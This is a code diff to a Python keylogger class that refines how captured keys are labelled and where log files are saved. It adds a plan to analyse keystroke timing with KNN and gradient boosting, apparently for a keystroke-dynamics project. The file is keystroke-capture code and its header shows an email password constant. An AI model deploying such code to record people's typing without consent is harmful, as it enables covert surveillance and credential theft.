@@ -12,7 +12,16 @@ EMAIL_PASSWORD = "thisisafakepassword"
 
 """
     Data-Processing:
-    1) 
+    1) ✅ Remove uneccessary "press" logs when button is held (use hashmap)
+    2) ✅ Map press events to release events (use stack)
+    3) ✅ Format to : Keyname | Time-pressed | Time released | User (use pandas dataframe)
+    4) Aggregate the format : Average hold time, press-press time, release-press time, APM (actions per minute)
+
+    Algo:
+    1) EDA
+    2) KNN
+    3) Gradient booster (XGB / LGBM)
+
 """
 
 class Keylogger:
@@ -40,10 +49,10 @@ class Keylogger:
             # uppercase with []
             if name == "space":
                 # " " instead of "space"
-                name = " "
+                name = "[SPACE]"
             elif name == "enter":
                 # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
+                name = "[ENTER]"
             elif name == "decimal":
                 name = "."
             else:
@@ -57,7 +66,7 @@ class Keylogger:
         # construct the filename to be identified by start & end datetimes
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{sys.argv[1]}_{start_dt_str}_{end_dt_str}"
+        self.filename = f"{sys.argv[1]}/keylog-{start_dt_str}_{end_dt_str}"
 
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
